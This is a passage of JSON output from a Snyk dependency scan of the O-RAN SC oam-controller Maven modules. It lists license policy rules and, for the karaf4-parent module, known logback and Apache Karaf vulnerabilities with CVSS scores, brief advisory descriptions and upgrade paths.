    "foundProjectCount": 20,
    "displayTargetFile": "parents/odlparent/binding-parent/pom.xml",
    "hasUnknownVersions": false,
    "path": "/Users/mohammedimaduddin/Desktop/oran/oransc-sanity/imad/scripts/snyk-scan-workspace/oam_oam-controller"
  },
  {
    "vulnerabilities": [],
    "ok": true,
    "dependencyCount": 3,
    "org": "mdimado",
    "policy": "# Snyk (https://snyk.io) policy file, patches or ignores known vulnerabilities.\nversion: v1.25.1\nignore: {}\npatch: {}\n",
    "isPrivate": true,
    "licensesPolicy": {
      "severities": {},
      "orgLicenseRules": {
        "AGPL-1.0": {
          "licenseType": "AGPL-1.0",
          "severity": "high",
          "instructions": ""
        },
        "AGPL-3.0": {
          "licenseType": "AGPL-3.0",
          "severity": "high",
          "instructions": ""
        },
        "Artistic-1.0": {
          "licenseType": "Artistic-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "Artistic-2.0": {
          "licenseType": "Artistic-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "CDDL-1.0": {
          "licenseType": "CDDL-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "CPOL-1.02": {
          "licenseType": "CPOL-1.02",
          "severity": "high",
          "instructions": ""
        },
        "EPL-1.0": {
          "licenseType": "EPL-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "GPL-2.0": {
          "licenseType": "GPL-2.0",
          "severity": "high",
          "instructions": ""
        },
        "GPL-3.0": {
          "licenseType": "GPL-3.0",
          "severity": "high",
          "instructions": ""
        },
        "LGPL-2.0": {
          "licenseType": "LGPL-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "LGPL-2.1": {
          "licenseType": "LGPL-2.1",
          "severity": "medium",
          "instructions": ""
        },
        "LGPL-3.0": {
          "licenseType": "LGPL-3.0",
          "severity": "medium",
          "instructions": ""
        },
        "MPL-1.1": {
          "licenseType": "MPL-1.1",
          "severity": "medium",
          "instructions": ""
        },
        "MPL-2.0": {
          "licenseType": "MPL-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "MS-RL": {
          "licenseType": "MS-RL",
          "severity": "medium",
          "instructions": ""
        },
        "SimPL-2.0": {
          "licenseType": "SimPL-2.0",
          "severity": "high",
          "instructions": ""
        }
      }
    },
    "packageManager": "maven",
    "ignoreSettings": {
      "adminOnly": false,
      "reasonRequired": false,
      "disregardFilesystemIgnores": false
    },
    "summary": "No known vulnerabilities",
    "filesystemPolicy": false,
    "uniqueCount": 0,
    "projectName": "org.o-ran-sc.oam-oam-controller.parent:bundle-parent",
    "foundProjectCount": 20,
    "displayTargetFile": "parents/odlparent/bundle-parent/pom.xml",
    "hasUnknownVersions": false,
    "path": "/Users/mohammedimaduddin/Desktop/oran/oransc-sanity/imad/scripts/snyk-scan-workspace/oam_oam-controller"
  },
  {
    "vulnerabilities": [],
    "ok": true,
    "dependencyCount": 1,
    "org": "mdimado",
    "policy": "# Snyk (https://snyk.io) policy file, patches or ignores known vulnerabilities.\nversion: v1.25.1\nignore: {}\npatch: {}\n",
    "isPrivate": true,
    "licensesPolicy": {
      "severities": {},
      "orgLicenseRules": {
        "AGPL-1.0": {
          "licenseType": "AGPL-1.0",
          "severity": "high",
          "instructions": ""
        },
        "AGPL-3.0": {
          "licenseType": "AGPL-3.0",
          "severity": "high",
          "instructions": ""
        },
        "Artistic-1.0": {
          "licenseType": "Artistic-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "Artistic-2.0": {
          "licenseType": "Artistic-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "CDDL-1.0": {
          "licenseType": "CDDL-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "CPOL-1.02": {
          "licenseType": "CPOL-1.02",
          "severity": "high",
          "instructions": ""
        },
        "EPL-1.0": {
          "licenseType": "EPL-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "GPL-2.0": {
          "licenseType": "GPL-2.0",
          "severity": "high",
          "instructions": ""
        },
        "GPL-3.0": {
          "licenseType": "GPL-3.0",
          "severity": "high",
          "instructions": ""
        },
        "LGPL-2.0": {
          "licenseType": "LGPL-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "LGPL-2.1": {
          "licenseType": "LGPL-2.1",
          "severity": "medium",
          "instructions": ""
        },
        "LGPL-3.0": {
          "licenseType": "LGPL-3.0",
          "severity": "medium",
          "instructions": ""
        },
        "MPL-1.1": {
          "licenseType": "MPL-1.1",
          "severity": "medium",
          "instructions": ""
        },
        "MPL-2.0": {
          "licenseType": "MPL-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "MS-RL": {
          "licenseType": "MS-RL",
          "severity": "medium",
          "instructions": ""
        },
        "SimPL-2.0": {
          "licenseType": "SimPL-2.0",
          "severity": "high",
          "instructions": ""
        }
      }
    },
    "packageManager": "maven",
    "ignoreSettings": {
      "adminOnly": false,
      "reasonRequired": false,
      "disregardFilesystemIgnores": false
    },
    "summary": "No known vulnerabilities",
    "filesystemPolicy": false,
    "uniqueCount": 0,
    "projectName": "org.o-ran-sc.oam-oam-controller.parent:feature-repo-parent",
    "foundProjectCount": 20,
    "displayTargetFile": "parents/odlparent/feature-repo-parent/pom.xml",
    "hasUnknownVersions": false,
    "path": "/Users/mohammedimaduddin/Desktop/oran/oransc-sanity/imad/scripts/snyk-scan-workspace/oam_oam-controller"
  },
  {
    "vulnerabilities": [
      {
        "id": "SNYK-JAVA-CHQOSLOGBACK-8539865",
        "title": "Server-side Request Forgery (SSRF)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:H",
        "credit": [
          "7asecurity"
        ],
        "semver": {
          "vulnerable": [
            "[,1.3.15)",
            "[1.4.0,1.5.13)"
          ]
        },
        "exploit": "Not Defined",
        "fixedIn": [
          "1.3.15",
          "1.5.13"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "java",
        "severity": "low",
        "cvssScore": 2.4,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "ch.qos.logback:logback-core",
        "references": [
          {
            "url": "https://logback.qos.ch/news.html%231.5.13",
            "title": "Additional Information"
          },
          {
            "url": "https://github.com/qos-ch/logback/commit/2863a4974a3649b5b00d4a529ee6ff2063470f35",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/qos-ch/logback/commit/5f05041cba4c4ac0a62748c5c527a2da48999f2d",
            "title": "GitHub Commit"
          },
          {
            "url": "https://logback.qos.ch/news.html%231.3.15",
            "title": "Release Notes"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "low",
            "cvssV3Vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:L/I:L/A:N",
            "cvssV3BaseScore": 3.3,
            "modificationTime": "2024-12-20T13:34:22.292262Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:P/PR:L/UI:P/VC:L/VI:N/VA:L/SC:H/SI:H/SA:H",
            "assigner": "Snyk",
            "severity": "low",
            "baseScore": 2.4,
            "cvssVersion": "4.0",
            "modificationTime": "2025-01-09T15:37:00.429266Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:H",
            "assigner": "Snyk",
            "severity": "high",
            "baseScore": 7.5,
            "cvssVersion": "3.1",
            "modificationTime": "2025-01-09T15:37:00.429266Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:L/I:L/A:N",
            "assigner": "Red Hat",
            "severity": "low",
            "baseScore": 3.3,
            "cvssVersion": "3.1",
            "modificationTime": "2024-12-20T13:34:22.292262Z"
          }
        ],
        "description": "## Overview\n[ch.qos.logback:logback-core](https://mvnrepository.com/artifact/ch.qos.logback/logback-core) is a logback-core module.\n\nAffected versions of this package are vulnerable to Server-side Request Forgery (SSRF) through the `SaxEventRecorder` process. An attacker can forge requests by compromising logback configuration files in XML.\n## Remediation\nUpgrade `ch.qos.logback:logback-core` to version 1.3.15, 1.5.13 or higher.\n## References\n- [Additional Information](https://logback.qos.ch/news.html#1.5.13)\n- [GitHub Commit](https://github.com/qos-ch/logback/commit/2863a4974a3649b5b00d4a529ee6ff2063470f35)\n- [GitHub Commit](https://github.com/qos-ch/logback/commit/5f05041cba4c4ac0a62748c5c527a2da48999f2d)\n- [Release Notes](https://logback.qos.ch/news.html#1.3.15)\n",
        "epssDetails": {
          "percentile": "0.15241",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-12801"
          ],
          "CWE": [
            "CWE-918"
          ],
          "GHSA": [
            "GHSA-6v67-2wr5-gvf4"
          ]
        },
        "packageName": "ch.qos.logback:logback-core",
        "proprietary": false,
        "creationTime": "2024-12-20T09:18:30.241574Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-12-19T18:31:37Z",
        "exploitDetails": {
          "sources": [],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Not Defined",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Not Defined",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "maven",
        "mavenModuleName": {
          "groupId": "ch.qos.logback",
          "artifactId": "logback-core"
        },
        "publicationTime": "2024-12-20T09:26:25.178712Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-01-09T15:37:00.429266Z",
        "socialTrendAlert": false,
        "severityWithCritical": "low",
        "from": [
          "org.o-ran-sc.oam-oam-controller.parent:karaf4-parent@13.0.0-SNAPSHOT",
          "org.apache.karaf.features:framework@4.4.6",
          "org.ops4j.pax.logging:pax-logging-logback@2.2.7",
          "ch.qos.logback:logback-core@1.3.14"
        ],
        "upgradePath": [
          false,
          "org.apache.karaf.features:framework@4.4.7",
          "org.ops4j.pax.logging:pax-logging-logback@2.2.8",
          "ch.qos.logback:logback-core@1.3.15"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "ch.qos.logback:logback-core",
        "version": "1.3.14"
      },
      {
        "id": "SNYK-JAVA-CHQOSLOGBACK-8539866",
        "title": "Improper Neutralization of Special Elements",
        "CVSSv3": "CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:C/C:L/I:H/A:L",
        "credit": [
          "7asecurity"
        ],
        "semver": {
          "vulnerable": [
            "[,1.3.15)",
            "[1.4.0,1.5.13)"
          ]
        },
        "exploit": "Not Defined",
        "fixedIn": [
          "1.3.15",
          "1.5.13"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "java",
        "severity": "medium",
        "cvssScore": 5.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "ch.qos.logback:logback-core",
        "references": [
          {
            "url": "https://logback.qos.ch/news.html%231.5.13",
            "title": "Additional Information"
          },
          {
            "url": "https://github.com/qos-ch/logback/commit/2cb6d520df7592ef1c3a198f1b5df3c10c93e183",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/qos-ch/logback/commit/b44b940cc7d4839e06e31a7d60dca174b99c1aa5",
            "title": "GitHub Commit"
          },
          {
            "url": "https://logback.qos.ch/news.html%231.3.15",
            "title": "Release Notes"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:L/I:H/A:L",
            "cvssV3BaseScore": 5.5,
            "modificationTime": "2024-12-20T13:34:31.345900Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:P/PR:H/UI:P/VC:L/VI:H/VA:L/SC:L/SI:H/SA:L",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 5.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-01-09T15:34:31.006257Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:C/C:L/I:H/A:L",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.4,
            "cvssVersion": "3.1",
            "modificationTime": "2025-01-09T15:34:31.006257Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:L/I:H/A:L",
            "assigner": "Red Hat",
            "severity": "medium",
            "baseScore": 5.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-12-20T13:34:31.345900Z"
          }
        ],
        "description": "## Overview\n[ch.qos.logback:logback-core](https://mvnrepository.com/artifact/ch.qos.logback/logback-core) is a logback-core module.\n\nAffected versions of this package are vulnerable to Improper Neutralization of Special Elements via the `JaninoEventEvaluator` extension. An attacker can execute arbitrary code by compromising an existing logback configuration file or injecting an environment variable before program execution.\n## Remediation\nUpgrade `ch.qos.logback:logback-core` to version 1.3.15, 1.5.13 or higher.\n## References\n- [Additional Information](https://logback.qos.ch/news.html#1.5.13)\n- [GitHub Commit](https://github.com/qos-ch/logback/commit/2cb6d520df7592ef1c3a198f1b5df3c10c93e183)\n- [GitHub Commit](https://github.com/qos-ch/logback/commit/b44b940cc7d4839e06e31a7d60dca174b99c1aa5)\n- [Release Notes](https://logback.qos.ch/news.html#1.3.15)\n",
        "epssDetails": {
          "percentile": "0.43206",
          "probability": "0.00207",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-12798"
          ],
          "CWE": [
            "CWE-138"
          ],
          "GHSA": [
            "GHSA-pr98-23f8-jwxv"
          ]
        },
        "packageName": "ch.qos.logback:logback-core",
        "proprietary": false,
        "creationTime": "2024-12-20T09:32:47.316612Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-12-19T18:31:37Z",
        "exploitDetails": {
          "sources": [],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Not Defined",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Not Defined",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "maven",
        "mavenModuleName": {
          "groupId": "ch.qos.logback",
          "artifactId": "logback-core"
        },
        "publicationTime": "2024-12-20T13:49:24.170686Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-01-09T15:34:31.006257Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "org.o-ran-sc.oam-oam-controller.parent:karaf4-parent@13.0.0-SNAPSHOT",
          "org.apache.karaf.features:framework@4.4.6",
          "org.ops4j.pax.logging:pax-logging-logback@2.2.7",
          "ch.qos.logback:logback-core@1.3.14"
        ],
        "upgradePath": [
          false,
          "org.apache.karaf.features:framework@4.4.7",
          "org.ops4j.pax.logging:pax-logging-logback@2.2.8",
          "ch.qos.logback:logback-core@1.3.15"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "ch.qos.logback:logback-core",
        "version": "1.3.14"
      },
      {
        "id": "SNYK-JAVA-CHQOSLOGBACK-8539867",
        "title": "Improper Neutralization of Special Elements",
        "CVSSv3": "CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:C/C:L/I:H/A:L",
        "credit": [
          "7asecurity"
        ],
        "semver": {
          "vulnerable": [
            "[,1.3.15)",
            "[1.4.0,1.5.13)"
          ]
        },
        "exploit": "Not Defined",
        "fixedIn": [
          "1.3.15",
          "1.5.13"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "java",
        "severity": "medium",
        "cvssScore": 5.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "ch.qos.logback:logback-classic",
        "references": [
          {
            "url": "https://logback.qos.ch/news.html%231.5.13",
            "title": "Additional Information"
          },
          {
            "url": "https://github.com/qos-ch/logback/commit/2cb6d520df7592ef1c3a198f1b5df3c10c93e183",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/qos-ch/logback/commit/b44b940cc7d4839e06e31a7d60dca174b99c1aa5",
            "title": "GitHub Commit"
          },
          {
            "url": "https://logback.qos.ch/news.html%231.3.15",
            "title": "Release Notes"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:L/I:H/A:L",
            "cvssV3BaseScore": 5.5,
            "modificationTime": "2024-12-20T13:34:31.345900Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:P/PR:H/UI:P/VC:L/VI:H/VA:L/SC:L/SI:H/SA:L",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 5.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-01-09T15:34:31.015955Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:C/C:L/I:H/A:L",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.4,
            "cvssVersion": "3.1",
            "modificationTime": "2025-01-09T15:34:31.015955Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:L/I:H/A:L",
            "assigner": "Red Hat",
            "severity": "medium",
            "baseScore": 5.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-12-20T13:34:31.345900Z"
          }
        ],
        "description": "## Overview\n[ch.qos.logback:logback-classic](https://mvnrepository.com/artifact/ch.qos.logback/logback-classic) is a reliable, generic, fast and flexible logging library for Java.\n\nAffected versions of this package are vulnerable to Improper Neutralization of Special Elements via the `JaninoEventEvaluator` extension. An attacker can execute arbitrary code by compromising an existing logback configuration file or injecting an environment variable before program execution.\n## Remediation\nUpgrade `ch.qos.logback:logback-classic` to version 1.3.15, 1.5.13 or higher.\n## References\n- [Additional Information](https://logback.qos.ch/news.html#1.5.13)\n- [GitHub Commit](https://github.com/qos-ch/logback/commit/2cb6d520df7592ef1c3a198f1b5df3c10c93e183)\n- [GitHub Commit](https://github.com/qos-ch/logback/commit/b44b940cc7d4839e06e31a7d60dca174b99c1aa5)\n- [Release Notes](https://logback.qos.ch/news.html#1.3.15)\n",
        "epssDetails": {
          "percentile": "0.43206",
          "probability": "0.00207",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-12798"
          ],
          "CWE": [
            "CWE-138"
          ],
          "GHSA": [
            "GHSA-pr98-23f8-jwxv"
          ]
        },
        "packageName": "ch.qos.logback:logback-classic",
        "proprietary": false,
        "creationTime": "2024-12-20T09:32:47.899909Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-12-19T18:31:37Z",
        "exploitDetails": {
          "sources": [],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Not Defined",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Not Defined",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "maven",
        "mavenModuleName": {
          "groupId": "ch.qos.logback",
          "artifactId": "logback-classic"
        },
        "publicationTime": "2024-12-20T13:49:24.484058Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-01-09T15:34:31.015955Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "org.o-ran-sc.oam-oam-controller.parent:karaf4-parent@13.0.0-SNAPSHOT",
          "org.apache.karaf.features:framework@4.4.6",
          "org.ops4j.pax.logging:pax-logging-logback@2.2.7",
          "ch.qos.logback:logback-classic@1.3.14"
        ],
        "upgradePath": [
          false,
          "org.apache.karaf.features:framework@4.4.7",
          "org.ops4j.pax.logging:pax-logging-logback@2.2.8",
          "ch.qos.logback:logback-classic@1.3.15"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "ch.qos.logback:logback-classic",
        "version": "1.3.14"
      },
      {
        "id": "SNYK-JAVA-ORGAPACHEKARAF-536198",
        "title": "Information Exposure",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",
        "credit": [
          "Unknown"
        ],
        "semver": {
          "vulnerable": [
            "[0,)"
          ]
        },
        "exploit": "Not Defined",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "java",
        "severity": "medium",
        "cvssScore": 4.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "org.apache.karaf:org.apache.karaf.client",
        "references": [
          {
            "url": "https://issues.apache.org/jira/browse/KARAF-4199",
            "title": "Jira Issue"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 4.3,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T13:58:04.184711Z"
          }
        ],
        "description": "## Overview\n[org.apache.karaf:org.apache.karaf.client](https://karaf.apache.org) is a modular open source OSGi runtime environment.\n\nAffected versions of this package are vulnerable to Information Exposure due to storing the password with the `interactive()` method. This method stores sensitive data in a String object, making it impossible to reliably purge the data from memory.\n## Remediation\nThere is no fixed version for `org.apache.karaf:org.apache.karaf.client`.\n## References\n- [Jira Issue](https://issues.apache.org/jira/browse/KARAF-4199)\n",
        "epssDetails": null,
        "identifiers": {
          "CVE": [],
          "CWE": [
            "CWE-200"
          ]
        },
        "packageName": "org.apache.karaf:org.apache.karaf.client",
        "proprietary": false,
        "creationTime": "2019-11-28T12:21:28.965065Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2015-12-22T08:18:18Z",
        "exploitDetails": {
          "sources": [],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Not Defined",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Not Defined",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "maven",
        "mavenModuleName": {
          "groupId": "org.apache.karaf",
          "artifactId": "org.apache.karaf.client"
        },
        "publicationTime": "2015-12-22T08:18:18Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-06T13:58:04.184711Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "org.o-ran-sc.oam-oam-controller.parent:karaf4-parent@13.0.0-SNAPSHOT",
          "org.apache.karaf.features:framework@4.4.6",
          "org.apache.karaf:org.apache.karaf.client@4.4.6"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "name": "org.apache.karaf:org.apache.karaf.client",
        "version": "4.4.6"
      }
    ],
    "ok": false,
    "dependencyCount": 73,
    "org": "mdimado",
    "policy": "# Snyk (https://snyk.io) policy file, patches or ignores known vulnerabilities.\nversion: v1.25.1\nignore: {}\npatch: {}\n",
    "isPrivate": true,
    "licensesPolicy": {
      "severities": {},
      "orgLicenseRules": {
        "AGPL-1.0": {
          "licenseType": "AGPL-1.0",
          "severity": "high",
          "instructions": ""
        },
        "AGPL-3.0": {
          "licenseType": "AGPL-3.0",
          "severity": "high",
          "instructions": ""
        },
        "Artistic-1.0": {
          "licenseType": "Artistic-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "Artistic-2.0": {
          "licenseType": "Artistic-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "CDDL-1.0": {
          "licenseType": "CDDL-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "CPOL-1.02": {
          "licenseType": "CPOL-1.02",
          "severity": "high",
          "instructions": ""
        },
        "EPL-1.0": {
          "licenseType": "EPL-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "GPL-2.0": {
          "licenseType": "GPL-2.0",
          "severity": "high",
          "instructions": ""
        },
        "GPL-3.0": {
          "licenseType": "GPL-3.0",
          "severity": "high",
          "instructions": ""
        },
        "LGPL-2.0": {
          "licenseType": "LGPL-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "LGPL-2.1": {
          "licenseType": "LGPL-2.1",
          "severity": "medium",
          "instructions": ""
        },
        "LGPL-3.0": {
          "licenseType": "LGPL-3.0",
          "severity": "medium",
          "instructions": ""
        },
        "MPL-1.1": {
          "licenseType": "MPL-1.1",
          "severity": "medium",
          "instructions": ""
        },
        "MPL-2.0": {
          "licenseType": "MPL-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "MS-RL": {
          "licenseType": "MS-RL",
          "severity": "medium",
          "instructions": ""
        },
        "SimPL-2.0": {
          "licenseType": "SimPL-2.0",
          "severity": "high",
          "instructions": ""
        }
      }
    },
    "packageManager": "maven",
    "ignoreSettings": {
      "adminOnly": false,
      "reasonRequired": false,
      "disregardFilesystemIgnores": false
    },
    "summary": "4 vulnerable dependency paths",
    "remediation": {
      "unresolved": [
        {
          "id": "SNYK-JAVA-ORGAPACHEKARAF-536198",
          "title": "Information Exposure",
          "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",
          "credit": [
            "Unknown"
          ],
          "semver": {
            "vulnerable": [
              "[0,)"
            ]
          },
          "exploit": "Not Defined",
          "fixedIn": [],
          "patches": [],
          "insights": {
            "triageAdvice": null
          },
          "language": "java",
          "severity": "medium",
          "cvssScore": 4.3,
          "functions": [],
          "malicious": false,
          "isDisputed": false,
          "moduleName": "org.apache.karaf:org.apache.karaf.client",
          "references": [
            {
              "url": "https://issues.apache.org/jira/browse/KARAF-4199",
              "title": "Jira Issue"
            }
          ],
          "cvssDetails": [],
          "cvssSources": [
            {
              "type": "primary",
              "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",
              "assigner": "Snyk",
              "severity": "medium",
              "baseScore": 4.3,
              "cvssVersion": "3.1",
              "modificationTime": "2024-03-06T13:58:04.184711Z"
            }
          ],
          "description": "## Overview\n[org.apache.karaf:org.apache.karaf.client](https://karaf.apache.org) is a modular open source OSGi runtime environment.\n\nAffected versions of this package are vulnerable to Information Exposure due to storing the password with the `interactive()` method. This method stores sensitive data in a String object, making it impossible to reliably purge the data from memory.\n## Remediation\nThere is no fixed version for `org.apache.karaf:org.apache.karaf.client`.\n## References\n- [Jira Issue](https://issues.apache.org/jira/browse/KARAF-4199)\n",
          "epssDetails": null,
          "identifiers": {
            "CVE": [],
            "CWE": [
              "CWE-200"
            ]
          },
          "packageName": "org.apache.karaf:org.apache.karaf.client",
          "proprietary": false,
          "creationTime": "2019-11-28T12:21:28.965065Z",
          "functions_new": [],
          "alternativeIds": [],
          "disclosureTime": "2015-12-22T08:18:18Z",
          "exploitDetails": {
            "sources": [],
            "maturityLevels": [
              {
                "type": "secondary",
                "level": "Not Defined",
                "format": "CVSSv3"
              },
              {
                "type": "primary",
                "level": "Not Defined",
                "format": "CVSSv4"
              }
            ]
          },
          "packageManager": "maven",
          "mavenModuleName": {
            "groupId": "org.apache.karaf",
            "artifactId": "org.apache.karaf.client"
          },
          "publicationTime": "2015-12-22T08:18:18Z",
          "severityBasedOn": "CVSS",
          "modificationTime": "2024-03-06T13:58:04.184711Z",
          "socialTrendAlert": false,
          "packagePopularityRank": 96,
          "from": [
            "org.o-ran-sc.oam-oam-controller.parent:karaf4-parent@13.0.0-SNAPSHOT",
            "org.apache.karaf.features:framework@4.4.6",
            "org.apache.karaf:org.apache.karaf.client@4.4.6"
          ],
          "upgradePath": [],
          "isUpgradable": false,
          "isPatchable": false,
          "isPinnable": false,
          "isRuntime": false,
          "name": "org.apache.karaf:org.apache.karaf.client",
          "version": "4.4.6",
          "severityWithCritical": "medium"
        }
      ],
      "upgrade": {
        "org.apache.karaf.features:framework@4.4.6": {
          "upgradeTo": "org.apache.karaf.features:framework@4.4.7",
          "upgrades": [
            "ch.qos.logback:logback-core@1.3.14",
            "ch.qos.logback:logback-core@1.3.14",
            "ch.qos.logback:logback-classic@1.3.14"
          ],
          "vulns": [
            "SNYK-JAVA-CHQOSLOGBACK-8539865",
            "SNYK-JAVA-CHQOSLOGBACK-8539866",
            "SNYK-JAVA-CHQOSLOGBACK-8539867"
          ]
        }
      },
      "patch": {},
      "ignore": {},
      "pin": {}
    },
    "filesystemPolicy": false,
    "filtered": {
      "ignore": [],
      "patch": []
    },
    "uniqueCount": 4,
    "projectName": "org.o-ran-sc.oam-oam-controller.parent:karaf4-parent",
    "foundProjectCount": 20,
    "displayTargetFile": "parents/odlparent/karaf4-parent/pom.xml",
    "hasUnknownVersions": false,
    "path": "/Users/mohammedimaduddin/Desktop/oran/oransc-sanity/imad/scripts/snyk-scan-workspace/oam_oam-controller"
  },
  {
    "vulnerabilities": [],
    "ok": true,
    "dependencyCount": 32,
    "org": "mdimado",
    "policy": "# Snyk (https://snyk.io) policy file, patches or ignores known vulnerabilities.\nversion: v1.25.1\nignore: {}\npatch: {}\n",
    "isPrivate": true,
    "licensesPolicy": {
      "severities": {},
      "orgLicenseRules": {
        "AGPL-1.0": {
          "licenseType": "AGPL-1.0",
          "severity": "high",
          "instructions": ""
        },
        "AGPL-3.0": {
          "licenseType": "AGPL-3.0",
          "severity": "high",
          "instructions": ""
        },
        "Artistic-1.0": {
          "licenseType": "Artistic-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "Artistic-2.0": {
          "licenseType": "Artistic-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "CDDL-1.0": {
          "licenseType": "CDDL-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "CPOL-1.02": {
          "licenseType": "CPOL-1.02",
          "severity": "high",
          "instructions": ""
        },
        "EPL-1.0": {
          "licenseType": "EPL-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "GPL-2.0": {
          "licenseType": "GPL-2.0",
          "severity": "high",
          "instructions": ""
        },
        "GPL-3.0": {
          "licenseType": "GPL-3.0",
          "severity": "high",
          "instructions": ""
        },
        "LGPL-2.0": {
          "licenseType": "LGPL-2.0",
          "severity": "medium",
